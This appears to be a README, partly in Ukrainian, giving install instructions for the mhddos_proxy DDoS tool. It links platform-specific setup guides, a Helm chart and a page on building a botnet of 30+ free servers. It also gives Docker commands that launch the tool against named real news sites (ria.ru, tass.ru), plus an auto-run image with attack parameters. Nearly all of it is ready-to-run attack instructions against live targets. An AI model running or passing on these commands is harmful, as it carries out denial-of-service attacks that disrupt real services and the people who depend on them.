### Windows

https://telegra.ph/Vstanovlennya-mhddos-proxy-napryamu-na-vash-komp-03-27  

### Linux

https://telegra.ph/mhddos-proxy-install-on-Linux-with-terminal-03-31  

### Mac

https://telegra.ph/Vstanovlennya-mhddos-proxy-napryamu-na-vash-Mac-04-03

### Android

https://telegra.ph/mhddos-proxy-for-Android-with-Termux-03-31  

### Helm

https://github.com/localdotcom/mhddos-proxy-helm

### Docker

Встановіть Docker

- Windows: https://docs.docker.com/desktop/windows/install/
- Mac: https://docs.docker.com/desktop/mac/install/
- Ubuntu: https://docs.docker.com/engine/install/ubuntu/
  
Запустіть через термінал(для Linux / Mac додайте sudo на початку):  
```shell
docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --table https://ria.ru https://tass.ru
```
Docker-image, який запускає одночасно mhddos_proxy та [proxy_finder](https://github.com/porthole-ascend-cinnamon/proxy_finder) (для Linux / Mac додайте sudo на початку):  
```shell
docker run -it --rm --pull always --name alexnestua ghcr.io/alexnest-ua/auto_mhddos_alexnest:latest 1 1500 1000 --debug
```
Більш детально про параметри читайте тут: https://github.com/alexnest-ua/auto_mhddos_alexnest/tree/docker  

### Додаткові потужності
- [**Створення ботнету з 30+ безкоштовних та автономних(працюють навіть при вимкненому ПК) Linux-серверів**](https://auto-ddos.notion.site/dd91326ed30140208383ffedd0f13e5c)
